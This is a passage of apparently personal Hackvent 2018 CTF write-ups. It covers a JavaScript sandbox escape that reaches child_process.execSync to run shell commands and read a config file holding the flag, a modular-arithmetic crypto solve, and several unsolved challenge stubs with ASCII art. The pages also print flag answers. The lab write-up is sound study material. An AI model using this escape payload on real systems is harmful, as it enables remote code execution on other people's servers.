<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendFile</span><span class="p">(</span><span class="nx">__dirname</span><span class="o">+</span><span class="dl">"</span><span class="s2">/index.html</span><span class="dl">"</span><span class="p">));</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">"</span><span class="s2">/code</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nf">sendFile</span><span class="p">(</span><span class="nx">__filename</span><span class="p">));</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="dl">"</span><span class="s2">/run</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>

	<span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">run</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">result</span><span class="p">:</span> <span class="dl">"</span><span class="s2">No code provided</span><span class="dl">"</span><span class="p">});</span>
		<span class="k">return</span><span class="p">;</span>
	<span class="p">}</span>

	<span class="kd">let</span> <span class="nx">boiler</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">const flag_</span><span class="dl">"</span> <span class="o">+</span> <span class="nf">require</span><span class="p">(</span><span class="dl">"</span><span class="s2">randomstring</span><span class="dl">"</span><span class="p">).</span><span class="nf">generate</span><span class="p">(</span><span class="mi">64</span><span class="p">)</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">=</span><span class="se">\"</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">flag</span> <span class="o">+</span> <span class="dl">"</span><span class="se">\"</span><span class="s2">;</span><span class="se">\n</span><span class="dl">"</span><span class="p">;</span>

	<span class="k">new</span> <span class="nf">sandbox</span><span class="p">().</span><span class="nf">run</span><span class="p">(</span><span class="nx">boiler</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">run</span><span class="p">,</span> <span class="p">(</span><span class="nx">out</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">result</span><span class="p">:</span> <span class="nx">out</span><span class="p">.</span><span class="nx">result</span><span class="p">}));</span>

<span class="p">});</span>

<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">);</span>
</pre></table></code></div></div><p>So the value we want is in a variable with a random name <code class="language-plaintext highlighter-rouge">flag_&lt;64randomchars&gt;</code>. So we either need to get it to spit out all variable names, or break out of the sandbox and print <code class="language-plaintext highlighter-rouge">boiler</code>, hmmm</p><p>We play around a bit but nothing obvious:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
</pre><td class="rouge-code"><pre>&gt;&gt; eval(6+6)
12

&gt;&gt; Object.keys(this)
[ 'print', 'console', 'process', 'postMessage' ]

&gt;&gt; Object.getOwnPropertyNames(this)
[ 'print',
'console',
'process',
'postMessage',
'Object',
'Function',
'Array',
'Number',
'parseFloat',
'parseInt',
'Infinity',
'NaN',
'undefined',
'Boolean',
'String',
'Symbol',
'Date',
'Promise',
'RegExp',
'Error',
'EvalError',
'RangeError',
'ReferenceError',
'SyntaxError',
'TypeError',
'URIError',
'JSON',
'Math',
'Intl',
'ArrayBuffer',
'Uint8Array',
'Int8Array',
'Uint16Array',
'Int16Array',
'Uint32Array',
'Int32Array',
'Float32Array',
'Float64Array',
'Uint8ClampedArray',
'BigUint64Array',
'BigInt64Array',
'DataView',
'Map',
'Set',
'WeakMap',
'WeakSet',
'Proxy',
'Reflect',
'decodeURI',
'decodeURIComponent',
'encodeURI',
'encodeURIComponent',
'escape',
'unescape',
'eval',
'isFinite',
'isNaN',
'SharedArrayBuffer',
'Atomics',
'BigInt',
'WebAssembly' ]
</pre></table></code></div></div><p>Then we find this github issue discussing vulnerabilities in this method of sandboxing: https://github.com/gf3/sandbox/issues/50</p><p>So we can get RCE by inputting the following:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>&gt;&gt;&gt; new Function(
"return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
)()("child_process").execSync("pwd")

{ type: 'Buffer', data: [ 47, 97, 112, 112, 10 ] }
</pre></table></code></div></div><p>We see that something is returned, but the output isn’t very useful to us, so we set the child process to inherit stdio from parent by setting <code class="language-plaintext highlighter-rouge">{stdio: 'inherit'}</code></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>&gt;&gt;&gt;
new Function(
  "return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
)()("child_process").execSync("pwd", {stdio: 'inherit'})

JSON Error (data was "/app
{"result":"null","console":[]}")
</pre></table></code></div></div><p>That’s better! Now let’s just read the config file since that will contain our flag:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>&gt;&gt;&gt;
new Function(
  "return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
)()("child_process").execSync("ls", {stdio: 'inherit'})

JSON Error (data was "config.json
config.json~
docker-compose.yaml
dockerfile
dockerfile~
index.html
main.js
node_modules
package-lock.json
package.json
run.js
{"result":"null","console":[]}")

&gt;&gt;&gt;
new Function(
  "return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())"
)()("child_process").execSync("cat config.json", {stdio: 'inherit'})

JSON Error (data was "{
"flag":"HV18-YtH3-S4nD-bx5A-Nt4G",
"port":3000
}

{"result":"null","console":[]}")
</pre></table></code></div></div><h2> Flag</h2><code> HV18-YtH3-S4nD-bx5A-Nt4G </code><hr><h1 id="day-11-crypt-o-math-3-0"> Day 11: Crypt-o-math 3.0 <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-11-crypt-o-math-30.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Last year’s challenge was too easy? Try to solve this one, you h4x0r!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>c = (a * b) % p
c=0x7E65D68F84862CEA3FCC15B966767CCAED530B87FC4061517A1497A03D2
p=0xDD8E05FF296C792D2855DB6B5331AF9D112876B41D43F73CEF3AC7425F9
b=0x7BBE3A50F28B2BA511A860A0A32AD71D4B5B93A8AE295E83350E68B57E5
</pre></table></code></div></div><p>finding “a” will give you the flag.</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="n">gmpy2</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="n">c</span> <span class="o">=</span> <span class="mh">0x7E65D68F84862CEA3FCC15B966767CCAED530B87FC4061517A1497A03D2</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="n">p</span> <span class="o">=</span> <span class="mh">0xDD8E05FF296C792D2855DB6B5331AF9D112876B41D43F73CEF3AC7425F9</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0x7BBE3A50F28B2BA511A860A0A32AD71D4B5B93A8AE295E83350E68B57E5</span>
<span class="gp">&gt;&gt;&gt;</span> <span class="nf">hex</span><span class="p">(</span><span class="n">gmpy2</span><span class="p">.</span><span class="nf">divm</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">p</span><span class="p">))</span>
<span class="sh">'</span><span class="s">0x485631382d4288bb2cdf615fc4576b25ba2ee4c74f5e8598ba6bbdfae8f</span><span class="sh">'</span>
</pre></table></code></div></div><p>This looks to start with <code class="language-plaintext highlighter-rouge">HV18</code>, but the rest of the flag is not valid ascii. In modular arithmetic however, <code class="language-plaintext highlighter-rouge">a + p % p = a</code> and <code class="language-plaintext highlighter-rouge">a + 2p % p = a</code> etc, so the modulus may be added any number of times and still give the same anwer. Therefore, we try adding <code class="language-plaintext highlighter-rouge">p</code> some number of times to the answer to get the real flag:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">binascii</span>
<span class="kn">import</span> <span class="n">gmpy2</span>

<span class="k">def</span> <span class="nf">int_to_text</span><span class="p">(</span><span class="n">i</span><span class="p">):</span>
    <span class="n">hex_string</span> <span class="o">=</span> <span class="sh">'</span><span class="s">%x</span><span class="sh">'</span> <span class="o">%</span> <span class="n">i</span>
    <span class="n">n</span> <span class="o">=</span> <span class="nf">len</span><span class="p">(</span><span class="n">hex_string</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">binascii</span><span class="p">.</span><span class="nf">unhexlify</span><span class="p">(</span><span class="n">hex_string</span><span class="p">.</span><span class="nf">zfill</span><span class="p">(</span><span class="n">n</span> <span class="o">+</span> <span class="p">(</span><span class="n">n</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)))</span>


<span class="n">c</span><span class="o">=</span><span class="mh">0x7E65D68F84862CEA3FCC15B966767CCAED530B87FC4061517A1497A03D2</span>
<span class="n">p</span><span class="o">=</span><span class="mh">0xDD8E05FF296C792D2855DB6B5331AF9D112876B41D43F73CEF3AC7425F9</span>
<span class="n">b</span><span class="o">=</span><span class="mh">0x7BBE3A50F28B2BA511A860A0A32AD71D4B5B93A8AE295E83350E68B57E5</span>

<span class="n">a</span> <span class="o">=</span> <span class="n">gmpy2</span><span class="p">.</span><span class="nf">divm</span><span class="p">(</span><span class="n">c</span><span class="p">,</span><span class="n">b</span><span class="p">,</span><span class="n">p</span><span class="p">)</span>

<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">pt</span> <span class="o">=</span> <span class="nf">int_to_text</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pt</span><span class="p">.</span><span class="nf">startswith</span><span class="p">(</span><span class="sh">'</span><span class="s">HV18</span><span class="sh">'</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">pt</span><span class="p">)</span>
        <span class="k">break</span>
    <span class="n">a</span> <span class="o">+=</span> <span class="n">p</span>
</pre></table></code></div></div><p>And this script outputs: <code class="language-plaintext highlighter-rouge">HV18-xLvY-TeNT-YgEh-wBuL-bFfz</code></p><h2> Flag</h2><code> HV18-xLvY-TeNT-YgEh-wBuL-bFfz </code><hr><h1 id="day-12-smartwishlist"> Day 12: SmartWishList <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-12-smartwishlist.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Santa’s being really innovative this year!</p><p>Send your wishes directly over your favorite messenger (telegram): @smartwishlist_bot</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Telegram bot vulnerable to sqli</p><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-13-flappy-s-revenge"> Day 13: flappy’s revenge <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-13-flappys-revenge.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There were some rumors that you were cheating at our little game a few days ago … like godmode, huh?</p><p>Well, show me that you can do it again - no cheating this time.</p><p>Location: telnet whale.hacking-lab.com 4242</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>This was the same game as in <a href="#day-07-flappy.pl">day 7</a>, but now running on remote server.</p><p>This game wasn’t too hard to get the hang of, just control the speed of the dot by hitting space at regular intervals and remember where the gaps are since they are the same every time. We just played it til the end?</p><h2> Flag</h2><code> HV18-9hYf-LSY1-hWdZ-496n-Mbda </code><hr><h1 id="day-14-power-in-the-shell"> Day 14: Power in the Shell <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-14.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>seems to be an easy one … or wait, what?</p><p>Encryped flag: <code class="language-plaintext highlighter-rouge">2A4C9AA52257B56837369D5DD7019451C0EC04427EB95EB741D0273D55</code></p><p><a href="writeupfiles/power.ps1">power.ps1</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-15-watch-me"> Day 15: Watch me <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-15-watch-me.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Turn on your TV! Santa will broadcast todays flag on his member channel. Can you get it without subscription?</p><p><a href="writeupfiles/HACKvent-2018_by_the_oneandonly_HaRdLoCk.ipa">Get it here</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-16-pay-100-bitcoins"> Day 16: Pay 100 Bitcoins <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-16-pay-100-bitcoins.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p>… or find the flag</p><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>It changed the host. Fortunately it doesn’t do the full job … so there’s hope. Get the things straight again and find the flag.</p><p>The OS is encrypted, but you know the key: IWillNeverGetAVirus</p><p><a href="writeupfiles/HACKvent_thx_awesome_1n1k.ova">ova image</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-17-faster-key-exchange"> Day 17: Faster KEy Exchange <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-17-faster-key-exchange.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>You were somehow able to intercept Santa’s traffic.</p><p>But it’s encrypted. Fortunately, you also intercepted the key exchange and figured out what software he was using…..</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>a = 175770199681350928919153172460360835780638752174913070111023213228157197096057417384591915694975480999440257710025303691337166219429638532300821869439381645912300207257027550022875895228511722173361505223671525172702506296884059248447500261555471990207802029962005554266521906318372882999990833356499237081758595947502374486405132806838592963676075235 42293538555215282798100455110266565881599829107971869244773384413618546118850868579583095489023778055976570366853411496753062216229293710557686212314300848121614558806328788578096144576605248971916454783615989429937555579437307320472405217413938048149254574677430624
b = 15228628318558071728245462802366236848375416102820239825350329247148900182647243994904519787528142824353837070194785550898962097219309344881183948914850354340893035399529028331238911753358245357848436203268982345430735846016484221944423499956958406189854969330305125479065873712331269870135028162018087451460656203085824963123310757985362748654204595136594184636862693563510767025800252822776154986386637346156842972134635578534633722315375292616298410141343725683471387328655106920310236007034951004329720717533666052625540760911360823548318810161367913281234234193760867208897459774865037319252137821553407707977377
message = jqMYIn4fzSqzIXArwJm/kPitNhf4lwhL0yPRKpF+NYXyPmhoEwNG/k2L5vCZqFWNPvTzisnu93/8uK/PZnnCGg==
</pre></table></code></div></div><p><a href="writeupfiles/FasterKeyExchange.py">FasterKeyExchange.py</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-18-be-evil"> Day 18: Be Evil <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-18-be-evil.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><em>Only today and for this challenge, please</em></p><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Download <a href="writeupfiles/evil.jar">evil.jar</a></p><p><code class="language-plaintext highlighter-rouge">java -jar evil.jar</code></p><p>Thanks to scal for the artwork!</p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-19-promocode"> Day 19: PromoCode <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-19-promocode.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><em>Get your free flag</em></p><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Santa is in good mood an gives away flags for free.</p><p><a href="https://hackvent.hacking-lab.com/Pr0m0C0de_new/promo.html">Get vour free flag</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-20-i-want-to-play-a-game"> Day 20: I want to play a game <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-20-i-want-to-play-a-game.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Santa did’nt forget about the games this year! Ready to play?</p><p>Get your game <a href="writeupfiles/HaRdvent.nro">here</a></p><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-21-muffinctf"> Day 21: MuffinCTF <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-21-muffinctf.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><em>day 1</em></p><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
</pre><td class="rouge-code"><pre>DAY 1 Services
    --------------------------------------------
          _______
         /       )
        /_____   | ______
       (  '   ) / /    __\   _____
        |.  '| / |     \ |  /     ))
        |____|/  |`-----'  /_____))
                  `-----'  `------'

        Name: bakery
        Description:
            Simply the best bakery in town!
            The good smell goes around the streets.
            Make sure that the thieves of the enemy nations cannot steal our bread!
            Maybe you have a method where we can get more bread?
        Creator: muffinx


                  / \  _  _  _  / \
                  | | / \/ \/ \ | |
              %   | |I| || || |=o | %
              %   | | j_jj_jj_j | | %     v %
            V |   | ||_________|| | | .:,&gt;@&lt;%%
           &gt;@&lt;| ; | | | || || | | | | ~*~ | |%
           *| |:X:| |I| || || | | | |*'|`\|/||   ~@~   *
          ,||/|`|'|_| |_||_||_| |_|,||,|/ |,||Vv,`|',v`|v hjw

        Name: garden
        Description:
            A very beautiful vegetable/fruit garden.
            There is even a pond where there are swimming fish and jumping frogs.
            Fix the defenses, in our past we had attacks with fire arrows.
            Also we are short in potatoes, please get us some more.
        Creator: muffinx
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-22-muffinctf"> Day 22: MuffinCTF <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-22-muffinctf.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><em>day 2</em></p><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre>    DAY 2 Services
    --------------------------------------------

                    ,-_                  (`  ).
                    |-_'-,              (     ).
                    |-_'-'           _(        '`.
            _        |-_'/        .=(`(      .     )
            /;-,_     |-_'        (     (.__.:-`-_.'
            /-.-;,-,___|'          `(       ) )
            /;-;-;-;_;_/|\_ _ _ _ _   ` __.:'   )
            x_( __`|_P_|`-;-;-;,|        `--'
            |\ \    _||   `-;-;-'
            | \`   -_|.      '-'
            | /   /-_| `
            |/   ,'-_|  \
            /____|'-_|___\
            _..,____]__|_\-_'|_[___,.._
            '                          ``'--,..,.
      Name: mill
      Description:
          The wheels are moving all day here.
          The best flour in the whole city is produced in this mill.
          Improve the security of the mill.
          And reduce production rate of food for enemy nations.
      Creator: xorkiwi

                         __--___
                       &gt;_'--'__'
                      _________!__________
                     /   /   /   /   /   /
                    /   /   /   /   /   /
                   |   |   |   |   |   |
              __^  |   |   |   |   |   |
            _/@  \  \   \   \   \   \   \
           S__   |   \   \   \   \   \   \         __
          (   |  |    \___\___\___\___\___\       /  \
              |   \             |                |  |\|
              \    \____________!________________/  /
               \ _______OOOOOOOOOOOOOOOOOOO________/
                \________\\\\\\\\\\\\\\\\\\_______/
      %%%^^^^^%%%%%^^^^!!^%%^^^^%%%%%!!!!^^^^^^!%^^^%%%%!!^^
      ^^!!!!%%%%^^^^!!^^%%%%%^^!!!^^%%%%%!!!%%%%^^^!!^^%%%!!

      Name: port
      Description:
          There are ships coming from a long distance.
          At the top of the light house you can have a nice view at the sea.
          Attention, make sure that there are no enemy ships coming into our port.
          Maybe you want to send some ships of us to remind them of our offensive capabilities.
      Creator: xorkiwi
</pre></table></code></div></div><h2 id="solution"><span class="mr-2">Solution</span><a href="#solution" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h2> Flag</h2><code> unsolved </code><hr><h1 id="day-23-muffinctf"> Day 23: MuffinCTF <a href="/CTF-writeups-public/writeups/Hackvent_2018/day-23-muffinctf.html"><i class="fa-solid fa-up-right-from-square" style="font-size: 1rem"></i></a></h1><p><em>day 3</em></p><h2 id="challenge"><span class="mr-2">Challenge</span><a href="#challenge" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre><td class="rouge-code"><pre> DAY 3 Services
      --------------------------------------------
            .
           /:\
           |:|
           |:|
           |:|
           |:|      __
         ,_|:|_,   /  )                     *_   _   _   _   _   _   _   *
           (Oo    / _I_                     | `_' `-' `_' `-' `_' `-' `_'|
            +\ \  || __|            ^       |                            |       ^
               \ \||___|            |       |                            |       |
                 \ /.:.\-\          |  (*)  |_   _   _   _   _   _   _   |  \^/  |
                  |.:. /-----\      | _&lt;"&gt;_ | `_' `-' `_' `-' `_' `-' `_'| _(#)_ |
                  |___|  oOo  |    o+o \a/ \0                            0/ \a/ (=)
                  /   |       |     0'\a-a/\/                            \/\a-a/`0
                 |_____\  :  /        /_^_\ |                            | /_^_\
                  | |  \ \:/          || || |                            | || ||
                  | |   | |           d|_|b_T____________________________T_d|_|b
                  \ /   | \___              /                           /
                  / |   \_____\         /                              /
                  `-'               /                                 /
         ________________________/                                   /___________

        Name: barracks
        Description:
            The knights and warriors of the king are here practicing the art of war.
            These guys are no joke, be respectful when you talk with them.
            Other nations sent their assassins to poision our warriors, make sure that we thighten our security.
            Also maybe talk with these guys and to show the enemies our powerful warriors.
        Creator: xorkiwi

                                  .- ._          *
                         .       (   ) `) ._,--.
                  _.-.          (      .' |    }      ._    +
                .'     )         `(_'-'   |--'"        ))        |
               (   _.   )                 |           '"       - * -
              .-.-'  )  _)  .        ["I"I"I"I"}   .             .
             (  `   .)`'              I_I_I_I_I
              `-. (   )          [UUUUI_I_I_I_I
                 `-..'            |[__I_I_[#]_I .        .
                           +      |__[I_I_I=I_I
                 .       ._    +  |]_ I_[#]-I_I    ._          ;
                         |~       |_[ I_I=I_I_[,   |~
                       uuuuu      |__ I_I_I%I_I  uuuuu
                       | #_|      |[ _$_I_I%%_I  | _ |
                       |-  [      | [ %%I_g%%_I  |  -|         __a:f
                  ---..|_  |.--,,'|]_ %_Ia%%I_I -|_- |.------""
                       |_-#|  ((  |_[ $%I%%_!^!  | _ |      +
                       |   |   )) |[_ |%.%I_|"|  |_  |    n Am   n
                     .-[_A_]_ '/  |_ / _Y_)_|`| -[N__]_        n
                 ._.'        `- _.--'`'  ' "|\=\ ''    `-.
                              .'             |\=\`-._     `
                           .-'                  `:.  `---....__
                                                   `
        Name: keep
        Description:
            This is the place where the king goes in difficult times.
            In your last audience it was clear, that the situation is critical.
            Defend the keep, the enemy troops are pushing more and more.
            And make sure that they pay for this.
        Creator: xorkiwi
